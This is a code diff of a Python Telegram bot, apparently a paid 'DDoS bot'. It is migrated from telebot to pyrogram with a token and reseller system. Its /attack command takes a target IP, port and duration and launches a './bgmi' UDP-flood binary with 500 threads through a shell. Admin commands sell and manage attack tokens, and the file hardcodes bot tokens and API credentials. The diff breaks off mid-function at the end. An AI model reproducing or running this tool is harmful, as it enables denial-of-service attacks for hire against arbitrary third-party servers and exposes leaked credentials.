@@ -1,590 +1,475 @@
-import os
-import telebot
-import logging
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+import sqlite3
 import subprocess
 import threading
 import time
-import json
-from datetime import datetime, timedelta
-
-# Setup
-logging.basicConfig(level=logging.INFO)
-TOKEN = '8699345560:AAEId4DfullLQZbW9hRFVIjLkI4xCG1fNXc'
-ADMIN_IDS = [1917682089]
-
-bot = telebot.TeleBot(TOKEN)
+import os
+from datetime import datetime
 
 # ============================================
-# DATA STRUCTURES
+# CONFIGURATION
 # ============================================
-user_attacks = {}
-user_cooldowns = {}
-active_attacks = {}  # {attack_id: {'user_id': xxx, 'target': xxx, 'end_time': xxx, 'duration': xxx}}
-attack_counter = 0
-attack_lock = threading.Lock()
+API_ID = 24676264
+API_HASH = "e04ebd801c8ae8b26986c482fb31f853"
+BOT_TOKEN = "8699345560:AAEId4DfullLQZbW9hRFVIjLkI4xCG1fNXc"
+OWNER_ID = 1917682089
+RESELLER_IDS = [2109683176]
 
-# Slot system
-MAX_ACTIVE_ATTACKS = 5  # Maximum 5 concurrent attacks
-FREE_SLOTS = MAX_ACTIVE_ATTACKS
-
-# User plans
-USER_PLANS = {}  # {user_id: {'plan': 300, 'expiry': datetime, 'approved': True}}
-APPROVED_USERS_FILE = "approved_users.json"
-USER_PLANS_FILE = "user_plans.json"
+# Attack binary path
+BGMI_PATH = "./bgmi"
 
 # ============================================
-# FILE HANDLING
+# DATABASE SETUP
 # ============================================
-def load_approved_users():
-    try:
-        with open(APPROVED_USERS_FILE, 'r') as f:
-            return set(json.load(f))
-    except FileNotFoundError:
-        return set()
+conn = sqlite3.connect('bot_database.db', check_same_thread=False)
+cursor = conn.cursor()
 
-def save_approved_users():
-    with open(APPROVED_USERS_FILE, 'w') as f:
-        json.dump(list(APPROVED_USERS), f)
+# Create tables
+cursor.execute('''
+CREATE TABLE IF NOT EXISTS users (
+    user_id INTEGER PRIMARY KEY,
+    username TEXT,
+    tokens INTEGER DEFAULT 5,
+    role TEXT DEFAULT 'member',
+    banned INTEGER DEFAULT 0,
+    attacks_done INTEGER DEFAULT 0
+)
+''')
 
-def load_user_plans():
-    try:
-        with open(USER_PLANS_FILE, 'r') as f:
-            data = json.load(f)
-            # Convert expiry strings back to datetime
-            for uid, plan in data.items():
-                plan['expiry'] = datetime.fromisoformat(plan['expiry'])
-            return data
-    except FileNotFoundError:
-        return {}
+cursor.execute('''
+CREATE TABLE IF NOT EXISTS attacks (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    user_id INTEGER,
+    ip TEXT,
+    port INTEGER,
+    duration INTEGER,
+    status TEXT DEFAULT 'running',
+    start_time TEXT,
+    end_time TEXT
+)
+''')
 
-def save_user_plans():
-    data = {}
-    for uid, plan in USER_PLANS.items():
-        data[uid] = {
-            'plan': plan['plan'],
-            'expiry': plan['expiry'].isoformat(),
-            'approved': plan['approved']
-        }
-    with open(USER_PLANS_FILE, 'w') as f:
-        json.dump(data, f)
-
-APPROVED_USERS = load_approved_users()
-USER_PLANS = load_user_plans()
+conn.commit()
 
 # ============================================
 # HELPER FUNCTIONS
 # ============================================
-def get_free_slots():
-    with attack_lock:
-        current_attacks = len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])
-        return MAX_ACTIVE_ATTACKS - current_attacks
+def get_user(user_id):
+    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
+    return cursor.fetchone()
 
-def get_active_attacks_count():
-    with attack_lock:
-        return len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])
+def add_user(user_id, username):
+    cursor.execute('INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)', (user_id, username))
+    conn.commit()
 
-def cleanup_old_attacks():
-    with attack_lock:
-        now = datetime.now()
-        expired = [aid for aid, attack in active_attacks.items() if attack['end_time'] <= now]
-        for aid in expired:
-            del active_attacks[aid]
+def deduct_token(user_id):
+    cursor.execute('UPDATE users SET tokens = tokens - 1 WHERE user_id = ? AND tokens > 0', (user_id,))
+    conn.commit()
+    return cursor.rowcount > 0
 
-def is_approved(user_id):
-    if user_id in ADMIN_IDS:
-        return True
-    if user_id in USER_PLANS:
-        plan = USER_PLANS[user_id]
-        if plan['expiry'] > datetime.now() and plan.get('approved', False):
-            return True
-    return user_id in APPROVED_USERS
+def add_attack_count(user_id):
+    cursor.execute('UPDATE users SET attacks_done = attacks_done + 1 WHERE user_id = ?', (user_id,))
+    conn.commit()
 
-def get_user_plan_info(user_id):
-    if user_id in ADMIN_IDS:
-        return {'plan': 'Admin', 'expiry': 'Lifetime', 'approved': True}
-    if user_id in USER_PLANS:
-        plan = USER_PLANS[user_id]
-        days_left = (plan['expiry'] - datetime.now()).days
-        return {
-            'plan': plan['plan'],
-            'expiry': plan['expiry'].strftime('%Y-%m-%d %H:%M:%S'),
-            'days_left': days_left,
-            'approved': plan.get('approved', False)
-        }
-    return None
+def log_attack(user_id, ip, port, duration):
+    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    cursor.execute('''
+        INSERT INTO attacks (user_id, ip, port, duration, start_time)
+        VALUES (?, ?, ?, ?, ?)
+    ''', (user_id, ip, port, duration, start_time))
+    conn.commit()
+    return cursor.lastrowid
 
-def approve_user_with_plan(user_id, plan_duration=300):
-    expiry = datetime.now() + timedelta(days=1)  # 1 day plan
-    USER_PLANS[user_id] = {
-        'plan': plan_duration,
-        'expiry': expiry,
-        'approved': True
-    }
-    APPROVED_USERS.add(user_id)
-    save_user_plans()
-    save_approved_users()
+def update_attack_status(attack_id, status):
+    end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    cursor.execute('UPDATE attacks SET status = ?, end_time = ? WHERE id = ?', (status, end_time, attack_id))
+    conn.commit()
+
+# ============================================
+# ATTACK FUNCTION
+# ============================================
+def run_bgmi_attack(attack_id, user_id, chat_id, ip, port, duration):
+    try:
+        # Check if bgmi exists
+        if not os.path.exists(BGMI_PATH):
+            app.send_message(chat_id, f"❌ Error: {BGMI_PATH} not found!")
+            update_attack_status(attack_id, "failed")
+            return
+        
+        # Build command
+        cmd = f"{BGMI_PATH} {ip} {port} {duration} 500"
+        print(f"[+] Executing: {cmd}")
+        
+        # Run attack
+        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        # Wait for attack to complete
+        time.sleep(duration)
+        process.terminate()
+        
+        # Update status
+        update_attack_status(attack_id, "completed")
+        
+        # Send completion message
+        app.send_message(
+            chat_id,
+            f"✅ *Attack Completed!*\n\n"
+            f"🎯 *Target:* `{ip}:{port}`\n"
+            f"⏰ *Duration:* `{duration}s`\n"
+            f"🔧 *Threads:* `500`\n\n"
+            f"👑 *Bot by:* @PRIME_X_ARMY_OWNER",
+            parse_mode="Markdown"
+        )
+        
+    except Exception as e:
+        update_attack_status(attack_id, "failed")
+        app.send_message(chat_id, f"❌ *Attack Failed:* `{str(e)}`", parse_mode="Markdown")
 
 # ============================================
 # COMMANDS
 # ============================================
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
+@app.on_message(filters.command("start"))
+async def start_command(client, message):
     user_id = message.from_user.id
-    username = message.from_user.username or message.from_user.first_name
+    username = message.from_user.username or "Unknown"
+    add_user(user_id, username)
     
-    free_slots = get_free_slots()
+    user = get_user(user_id)
+    tokens = user[2] if user else 5
     
-    if is_approved(user_id):
-        plan_info = get_user_plan_info(user_id)
-        status_text = f"✅ *APPROVED*\n📋 *Plan:* {plan_info['plan']}s\n⏰ *Valid:* {plan_info.get('days_left', 'Lifetime')} days left"
-    else:
-        status_text = "⏳ *PENDING APPROVAL*\nContact owner for approval"
-    
-    welcome_msg = (
-        f"🎯 *Po Pvt DDoS Bot*\n\n"
+    await message.reply_text(
+        f"🔥 *PRIME ONYX DDoS Bot* 🔥\n\n"
         f"👤 *User:* @{username}\n"
-        f"{status_text}\n\n"
+        f"💰 *Tokens:* `{tokens}`\n"
+        f"📊 *Attacks Done:* `{user[5] if user else 0}`\n\n"
         f"📌 *Commands:*\n"
-        f"🔹 /attack IP PORT TIME - Launch attack\n"
-        f"🔹 /status - Check slots & active attacks\n"
-        f"🔹 /myinfo - Your account info\n"
-        f"🔹 /when - Your attack remaining time\n"
-        f"🔹 /rules - Bot rules\n"
-        f"🔹 /owner - Contact info\n"
-        f"🔹 /canary - HttpCanary download\n\n"
-        f"🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"
+        f"`/attack IP PORT TIME` - Start UDP flood\n"
+        f"`/tokens` - Check balance\n"
+        f"`/status` - Bot status\n"
+        f"`/help` - Help menu\n\n"
+        f"💡 *1 token = 1 attack (10-300 sec)*\n\n"
+        f"👑 *Bot by:* @PRIME_X_ARMY_OWNER",
+        parse_mode="Markdown"
     )
-    bot.reply_to(message, welcome_msg, parse_mode="Markdown")
 
-@bot.message_handler(commands=['attack'])
-def attack_command(message):
-    global attack_counter
-    
+@app.on_message(filters.command("attack"))
+async def attack_command(client, message):
     user_id = message.from_user.id
-    username = message.from_user.username or message.from_user.first_name
+    args = message.text.split()
     
-    # Check approval
-    if not is_approved(user_id):
-        bot.reply_to(
-            message,
-            f"❌ *Access Denied!*\n\nYour account is not approved.\nContact /owner for approval.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
+    user = get_user(user_id)
+    if not user:
+        await message.reply_text("❌ Use /start first")
+        return
+    
+    if user[4] == 1:
+        await message.reply_text("❌ You are banned!")
+        return
+    
+    if user[2] <= 0:
+        await message.reply_text("❌ No tokens left! Contact reseller.")
+        return
+    
+    if len(args) != 4:
+        await message.reply_text(
+            f"❌ *Usage:* `/attack IP PORT TIME`\n\n"
+            f"📌 *Example:* `/attack 1.1.1.1 80 60`\n"
+            f"💰 *Your tokens:* `{user[2]}`\n\n"
+            f"⏰ *Time range:* 10-300 seconds",
             parse_mode="Markdown"
         )
         return
     
-    # Check if user has valid plan
-    plan_info = get_user_plan_info(user_id)
-    if plan_info and plan_info.get('days_left', 0) < 0 and user_id not in ADMIN_IDS:
-        bot.reply_to(
-            message,
-            f"❌ *Plan Expired!*\n\nYour plan has expired. Contact /owner to renew.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
-            parse_mode="Markdown"
-        )
-        return
-    
-    # Check cooldown
-    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
-        remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
-        free_slots = get_free_slots()
-        bot.reply_to(
-            message,
-            f"⏰ *Cooldown Active!*\n\nPlease wait {remaining} seconds before next attack.\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
-            parse_mode="Markdown"
-        )
-        return
-    
-    # Check daily limit (for non-admin)
-    if user_id not in ADMIN_IDS:
-        if user_attacks.get(user_id, 0) >= 50:
-            bot.reply_to(
-                message,
-                f"❌ *Daily Limit Reached!*\n\nYou have reached 50 attacks per day limit.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
-                parse_mode="Markdown"
-            )
-            return
-    
-    # Check available slots
-    free_slots = get_free_slots()
-    if free_slots <= 0:
-        bot.reply_to(
-            message,
-            f"❌ *API Error!*\n\nYou have {MAX_ACTIVE_ATTACKS} active attacks. Maximum allowed: {MAX_ACTIVE_ATTACKS}\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
-            parse_mode="Markdown"
-        )
-        return
+    ip = args[1]
+    port = args[2]
+    duration = args[3]
     
     try:
-        args = message.text.split()[1:]
-        if len(args) != 3:
-            bot.reply_to(
-                message,
-                f"✅ *Ready to launch an attack?*\n\nFormat: `/attack <ip> <port> <duration>`\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
-                parse_mode="Markdown"
-            )
+        port_num = int(port)
+        if port_num < 1 or port_num > 65535:
+            await message.reply_text("❌ Invalid port! Use 1-65535")
             return
         
-        ip, port, time_val = args
+        duration_sec = int(duration)
+        if duration_sec < 10 or duration_sec > 300:
+            await message.reply_text("❌ Invalid duration! Use 10-300 seconds")
+            return
         
-        # Validation
+        # Validate IP
         parts = ip.split('.')
         if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
-            bot.reply_to(message, f"❌ *Invalid IP address!*\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
+            await message.reply_text("❌ Invalid IP address!")
             return
         
-        if not port.isdigit() or not (1 <= int(port) <= 65535):
-            bot.reply_to(message, f"❌ *Invalid port!* (1-65535)\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
-            return
-        
-        duration = int(time_val)
-        if duration < 1 or duration > 300:
-            bot.reply_to(message, f"❌ *Invalid duration!* (1-300 seconds)\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
-            return
-        
-        # Update stats
-        user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
-        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=30)
-        
-        # Create attack record
-        with attack_lock:
-            attack_counter += 1
-            attack_id = attack_counter
-            end_time = datetime.now() + timedelta(seconds=duration)
-            active_attacks[attack_id] = {
-                'user_id': user_id,
-                'username': username,
-                'target': f"{ip}:{port}",
-                'end_time': end_time,
-                'duration': duration,
-                'start_time': datetime.now()
-            }
-        
-        remaining_slots = get_free_slots()
-        
-        # Send attack started message
-        bot.reply_to(
-            message,
-            f"🚀 *Attack Initiated!*\n\n"
-            f"🎯 *Target:* {ip}:{port}\n"
-            f"⏰ *Duration:* {duration}s\n"
-            f"⏳ *Time left:* {duration}s\n"
-            f"🔧 *Threads:* 500\n\n"
-            f"🟢 *Free Slots:* {remaining_slots}/{MAX_ACTIVE_ATTACKS}\n"
-            f"📊 *Slot Status:* {remaining_slots}/{MAX_ACTIVE_ATTACKS} free",
-            parse_mode="Markdown"
-        )
-        
-        # Start attack thread
-        attack_thread = threading.Thread(
-            target=execute_attack_with_timer,
-            args=(attack_id, ip, int(port), duration, username, user_id, message.chat.id)
-        )
-        attack_thread.daemon = True
-        attack_thread.start()
-        
+        # Deduct token and log attack
+        if deduct_token(user_id):
+            attack_id = log_attack(user_id, ip, port_num, duration_sec)
+            add_attack_count(user_id)
+            
+            # Get updated token count
+            user = get_user(user_id)
+            tokens_left = user[2]
+            
+            # Send confirmation
+            await message.reply_text(
+                f"🚀 *Attack Initiated!*\n\n"
+                f"🎯 *Target:* `{ip}:{port_num}`\n"
+                f"⏰ *Duration:* `{duration_sec}s`\n"
+                f"🔧 *Threads:* `500`\n"
+                f"💰 *Tokens Left:* `{tokens_left}`\n\n"
+                f"⚡ *Attack running...*",
+                parse_mode="Markdown"
+            )
+            
+            # Start attack in background thread
+            thread = threading.Thread(
+                target=run_bgmi_attack,
+                args=(attack_id, user_id, message.chat.id, ip, port_num, duration_sec)
+            )
+            thread.daemon = True
+            thread.start()
+        else:
+            await message.reply_text("❌ Failed to deduct token! Please try again.")
+            
+    except ValueError:
+        await message.reply_text("❌ Invalid port or duration! Use numbers only.")
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* {str(e)}\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
+        await message.reply_text(f"❌ Error: {str(e)}")
 
-@bot.message_handler(commands=['status'])
-def status_command(message):
+@app.on_message(filters.command("tokens"))
+async def tokens_command(client, message):
     user_id = message.from_user.id
+    user = get_user(user_id)
     
-    if not is_approved(user_id):
-        bot.reply_to(message, f"❌ *Access Denied!*\nContact /owner for approval.", parse_mode="Markdown")
+    if not user:
+        await message.reply_text("❌ Use /start first")
         return
     
-    free_slots = get_free_slots()
-    active_count = get_active_attacks_count()
-    
-    # Get user's active attacks
-    user_active = []
-    with attack_lock:
-        for aid, attack in active_attacks.items():
-            if attack['user_id'] == user_id and attack['end_time'] > datetime.now():
-                remaining = int((attack['end_time'] - datetime.now()).seconds)
-                user_active.append(f"• {attack['target']} - {remaining}s left")
-    
-    status_msg = (
-        f"📊 *Attack Status*\n\n"
-        f"🟢 *Free Slots:* {free_slots}/{MAX_ACTIVE_ATTACKS}\n"
-        f"⚡ *Active Attacks:* {active_count}/{MAX_ACTIVE_ATTACKS}\n\n"
-        f"👤 *Your Active Attacks:*\n"
+    await message.reply_text(
+        f"💰 *Token Balance*\n\n"
+        f"👤 *User:* @{user[1]}\n"
+        f"🎟️ *Tokens:* `{user[2]}`\n"
+        f"📊 *Attacks Done:* `{user[5]}`\n\n"
+        f"💡 *Contact reseller to buy more tokens*",
+        parse_mode="Markdown"
     )
-    
-    if user_active:
-        status_msg += "\n".join(user_active)
-    else:
-        status_msg += "No active attacks"
-    
-    status_msg += f"\n\n📈 *Total Today:* {user_attacks.get(user_id, 0)}/50"
-    
-    bot.reply_to(message, status_msg, parse_mode="Markdown")
 
-@bot.message_handler(commands=['myinfo'])
-def myinfo_command(message):
-    user_id = message.from_user.id
-    username = message.from_user.username or message.from_user.first_name
+@app.on_message(filters.command("status"))
+async def status_command(client, message):
+    # Get active attacks count
+    cursor.execute('SELECT COUNT(*) FROM attacks WHERE status = "running"')
+    running = cursor.fetchone()[0]
     
-    if not is_approved(user_id):
-        bot.reply_to(message, f"❌ *Access Denied!*\nContact /owner for approval.", parse_mode="Markdown")
+    # Get total users
+    cursor.execute('SELECT COUNT(*) FROM users')
+    total_users = cursor.fetchone()[0]
+    
+    # Get total attacks
+    cursor.execute('SELECT COUNT(*) FROM attacks')
+    total_attacks = cursor.fetchone()[0]
+    
+    await message.reply_text(
+        f"📊 *Bot Status*\n\n"
+        f"🟢 *Running Attacks:* `{running}`\n"
+        f"👥 *Total Users:* `{total_users}`\n"
+        f"📈 *Total Attacks:* `{total_attacks}`\n"
+        f"⚡ *Max Concurrent:* `5`\n\n"
+        f"✅ *Bot is operational*",
+        parse_mode="Markdown"
+    )
+
+@app.on_message(filters.command("help"))
+async def help_command(client, message):
+    user_id = message.from_user.id
+    user = get_user(user_id)
+    
+    if not user:
+        await message.reply_text("❌ Use /start first")
         return
     
-    plan_info = get_user_plan_info(user_id)
+    is_admin = user_id == OWNER_ID or user_id in RESELLER_IDS
     
-    if plan_info:
-        info_msg = (
-            f"👤 *User Info*\n\n"
-            f"📛 *Username:* @{username}\n"
-            f"🆔 *User ID:* `{user_id}`\n"
-            f"✅ *Status:* Approved\n"
-            f"📋 *Plan:* {plan_info['plan']} seconds\n"
-            f"⏰ *Valid for:* {plan_info.get('days_left', 'Lifetime')} days\n"
-            f"📅 *Expiry:* {plan_info.get('expiry', 'Never')}\n\n"
-            f"📊 *Today's Attacks:* {user_attacks.get(user_id, 0)}/50\n"
-            f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
-        )
+    if is_admin:
+        help_text = """
+👑 *Admin Commands*
+
+📌 *Member Commands:*
+`/attack IP PORT TIME` - Start attack
+`/tokens` - Check balance
+`/status` - Bot status
+
+🔧 *Admin Only:*
+`/addtokens <user_id> <amount>` - Add tokens
+`/ban <user_id>` - Ban user
+`/unban <user_id>` - Unban user
+`/listusers` - List all users
+`/broadcast <message>` - Send to all
+`/reset` - Reset all attacks
+
+👑 *Bot by:* @PRIME_X_ARMY_OWNER
+"""
     else:
-        info_msg = (
-            f"👤 *User Info*\n\n"
-            f"📛 *Username:* @{username}\n"
-            f"🆔 *User ID:* `{user_id}`\n"
-            f"⏳ *Status:* Pending Approval\n\n"
-            f"Contact /owner to get approved"
-        )
-    
-    bot.reply_to(message, info_msg, parse_mode="Markdown")
+        help_text = """
+👤 *Member Commands*
 
-@bot.message_handler(commands=['when'])
-def when_command(message):
-    user_id = message.from_user.id
-    
-    if not is_approved(user_id):
-        bot.reply_to(message, f"❌ *Access Denied!*", parse_mode="Markdown")
-        return
-    
-    # Get user's active attacks
-    user_active = []
-    with attack_lock:
-        for aid, attack in active_attacks.items():
-            if attack['user_id'] == user_id and attack['end_time'] > datetime.now():
-                remaining = int((attack['end_time'] - datetime.now()).seconds)
-                user_active.append((attack['target'], remaining))
-    
-    if user_active:
-        msg = "⏰ *Your Attack Remaining Time*\n\n"
-        for target, remaining in user_active:
-            msg += f"🎯 {target}\n   ⏳ *{remaining} seconds left*\n\n"
-    else:
-        msg = "✅ *No active attacks*\n\nYou don't have any running attacks at the moment."
-    
-    msg += f"\n🟢 *Free Slots:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS}"
-    bot.reply_to(message, msg, parse_mode="Markdown")
+`/attack IP PORT TIME` - Start UDP flood
+`/tokens` - Check token balance
+`/status` - Bot status
+`/start` - Welcome message
 
-@bot.message_handler(commands=['rules'])
-def rules_command(message):
-    rules_msg = (
-        f"📜 *Bot Rules*\n\n"
-        f"1️⃣ Use attacks responsibly\n"
-        f"2️⃣ Maximum 50 attacks per day\n"
-        f"3️⃣ Maximum 300 seconds per attack\n"
-        f"4️⃣ 30 seconds cooldown between attacks\n"
-        f"5️⃣ Max {MAX_ACTIVE_ATTACKS} concurrent attacks\n"
-        f"6️⃣ Don't share bot with others\n"
-        f"7️⃣ No attacking educational/government sites\n\n"
-        f"⚠️ *Violation may lead to ban!*\n\n"
-        f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
-    )
-    bot.reply_to(message, rules_msg, parse_mode="Markdown")
+📌 *Example:*
+`/attack 1.1.1.1 80 60`
 
-@bot.message_handler(commands=['owner'])
-def owner_command(message):
-    owner_msg = (
-        f"👑 *Bot Owner*\n\n"
-        f"For approval, support, or queries:\n"
-        f"🆔 Admin ID: `{ADMIN_IDS[0]}`\n"
-        f"💬 Contact: @Pk_Chopra\n\n"
-        f"💡 *To get approved:*\n"
-        f"Send your User ID to admin\n\n"
-        f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
-    )
-    bot.reply_to(message, owner_msg, parse_mode="Markdown")
+💡 *1 token = 1 attack (10-300 sec)*
+💰 *Buy tokens from reseller*
 
-@bot.message_handler(commands=['canary'])
-def canary_command(message):
-    canary_msg = (
-        f"🐦 *HttpCanary Download*\n\n"
-        f"Download HttpCanary for packet capture:\n"
-        f"📱 *Android:* Google Play Store\n"
-        f"🔗 *Direct:* https://httpcanary.com/download\n\n"
-        f"Use it to capture and analyze network packets\n\n"
-        f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
-    )
-    bot.reply_to(message, canary_msg, parse_mode="Markdown")
+👑 *Bot by:* @PRIME_X_ARMY_OWNER
+"""
+    
+    await message.reply_text(help_text, parse_mode="Markdown")
 
 # ============================================
 # ADMIN COMMANDS
 # ============================================
 
-@bot.message_handler(commands=['approve'])
-def approve_user_command(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
+@app.on_message(filters.command("addtokens"))
+async def add_tokens(client, message):
+    user_id = message.from_user.id
+    
+    if user_id != OWNER_ID and user_id not in RESELLER_IDS:
+        await message.reply_text("❌ Admin only command!")
         return
     
-    try:
-        args = message.text.split()
-        if len(args) < 2:
-            bot.reply_to(message, "❌ *Usage:* `/approve <user_id> [plan_duration]`", parse_mode="Markdown")
-            return
-        
-        target_id = int(args[1])
-        plan_duration = int(args[2]) if len(args) > 2 else 300
-        
-        approve_user_with_plan(target_id, plan_duration)
-        bot.reply_to(
-            message,
-            f"✅ *User Approved!*\n\nUser ID: `{target_id}`\n📋 Plan: {plan_duration}s\n⏰ Valid for: 1 day\n\nThey can now use /attack command",
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* {str(e)}", parse_mode="Markdown")
-
-@bot.message_handler(commands=['remove'])
-def remove_user_command(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
+    args = message.text.split()
+    if len(args) != 3:
+        await message.reply_text("❌ Usage: `/addtokens <user_id> <amount>`", parse_mode="Markdown")
         return
     
-    try:
-        args = message.text.split()
-        if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/remove <user_id>`", parse_mode="Markdown")
-            return
-        
-        target_id = int(args[1])
-        
-        if target_id in ADMIN_IDS:
-            bot.reply_to(message, "❌ *Cannot remove admin!*", parse_mode="Markdown")
-            return
-        
-        APPROVED_USERS.discard(target_id)
-        if str(target_id) in USER_PLANS:
-            del USER_PLANS[str(target_id)]
-        save_user_plans()
-        save_approved_users()
-        
-        bot.reply_to(message, f"❌ *User Removed!*\n\nUser ID: `{target_id}`\nApproval revoked.", parse_mode="Markdown")
-    except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* {str(e)}", parse_mode="Markdown")
+    target_id = int(args[1])
+    amount = int(args[2])
+    
+    cursor.execute('UPDATE users SET tokens = tokens + ? WHERE user_id = ?', (amount, target_id))
+    conn.commit()
+    
+    await message.reply_text(f"✅ Added `{amount}` tokens to user `{target_id}`", parse_mode="Markdown")
 
-@bot.message_handler(commands=['reset_TF'])
-def reset_all_limits(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
+@app.on_message(filters.command("ban"))
+async def ban_user(client, message):
+    user_id = message.from_user.id
+    
+    if user_id != OWNER_ID:
+        await message.reply_text("❌ Owner only command!")
         return
     
-    user_attacks.clear()
-    user_cooldowns.clear()
-    bot.reply_to(message, "🔄 *All limits have been reset by ADMIN!*", parse_mode="Markdown")
-
-@bot.message_handler(commands=['slots'])
-def slots_command(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
+    args = message.text.split()
+    if len(args) != 2:
+        await message.reply_text("❌ Usage: `/ban <user_id>`", parse_mode="Markdown")
         return
     
-    free_slots = get_free_slots()
-    active_count = get_active_attacks_count()
+    target_id = int(args[1])
+    cursor.execute('UPDATE users SET banned = 1 WHERE user_id = ?', (target_id,))
+    conn.commit()
     
-    msg = f"📊 *Server Status*\n\n🟢 Free Slots: {free_slots}/{MAX_ACTIVE_ATTACKS}\n⚡ Active Attacks: {active_count}/{MAX_ACTIVE_ATTACKS}\n\n"
+    await message.reply_text(f"🔴 User `{target_id}` banned!", parse_mode="Markdown")
+
+@app.on_message(filters.command("unban"))
+async def unban_user(client, message):
+    user_id = message.from_user.id
     
-    with attack_lock:
-        for aid, attack in active_attacks.items():
-            if attack['end_time'] > datetime.now():
-                remaining = int((attack['end_time'] - datetime.now()).seconds)
-                msg += f"🔹 #{aid}: {attack['target']} - {remaining}s - @{attack['username']}\n"
+    if user_id != OWNER_ID:
+        await message.reply_text("❌ Owner only command!")
+        return
     
-    bot.reply_to(message, msg, parse_mode="Markdown")
+    args = message.text.split()
+    if len(args) != 2:
+        await message.reply_text("❌ Usage: `/unban <user_id>`", parse_mode="Markdown")
+        return
+    
+    target_id = int(args[1])
+    cursor.execute('UPDATE users SET banned = 0 WHERE user_id = ?', (target_id,))
+    conn.commit()
+    
+    await message.reply_text(f"🟢 User `{target_id}` unbanned!", parse_mode="Markdown")
+
+@app.on_message(filters.command("listusers"))
+async def list_users(client, message):
+    user_id = message.from_user.id
+    
+    if user_id != OWNER_ID and user_id not in RESELLER_IDS:
+        await message.reply_text("❌ Admin only command!")
+        return
+    
+    cursor.execute('SELECT user_id, username, tokens, attacks_done, banned FROM users LIMIT 20')
+    users = cursor.fetchall()
+    
+    if not users:
+        await message.reply_text("No users found")
+        return
+    
+    user_list = "\n".join([
+        f"🆔 `{u[0]}` | @{u[1] or 'NoName'} | 🎟️ {u[2]} | 📊 {u[3]} | {'🔴' if u[4] else '🟢'}"
+        for u in users
+    ])
+    
+    await message.reply_text(
+        f"👥 *User List*\n\n{user_list}\n\nTotal: `{len(users)}`",
+        parse_mode="Markdown"
+    )
+
+@app.on_message(filters.command("broadcast"))
+async def broadcast(client, message):
+    user_id = message.from_user.id
+    
+    if user_id != OWNER_ID:
+        await message.reply_text("❌ Owner only command!")
+        return
+    
+    msg_text = message.text.replace('/broadcast', '').strip()
+    if not msg_text:
+        await message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
+        return
+    
+    cursor.execute('SELECT user_id FROM users')
+    users = cursor.fetchall()
+    
+    success = 0
+    failed = 0
+    
+    for user in users:
+        try:
+            await client.send_message(user[0], f"📢 *Announcement*\n\n{msg_text}\n\n👑 @PRIME_X_ARMY_OWNER", parse_mode="Markdown")
+            success += 1
+        except:
+            failed += 1
+        time.sleep(0.1)
+    
+    await message.reply_text(f"✅ Broadcast sent!\n\n📨 Success: `{success}`\n❌ Failed: `{failed}`", parse_mode="Markdown")
+
+@app.on_message(filters.command("reset"))
+async def reset_command(client, message):
+    user_id = message.from_user.id
+    
+    if user_id != OWNER_ID:
+        await message.reply_text("❌ Owner only command!")
+        return
+    
+    cursor.execute('UPDATE attacks SET status = "stopped" WHERE status = "running"')
+    conn.commit()
+    
+    await message.reply_text("🔄 All running attacks stopped!", parse_mode="Markdown")
 
 # ============================================
-# ATTACK EXECUTION
+# RUN BOT
 # ============================================
-
-def execute_attack_with_timer(attack_id, ip, port, duration, username, user_id, chat_id):
-    try:
-        cmd = f"./bgmi {ip} {port} {duration} 500"
-        logging.info(f"Executing: {cmd}")
-        
-        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, executable='/bin/bash')
-        
-        # Send updates every 30 seconds
-        for remaining in range(duration, 0, -30):
-            if remaining > 0:
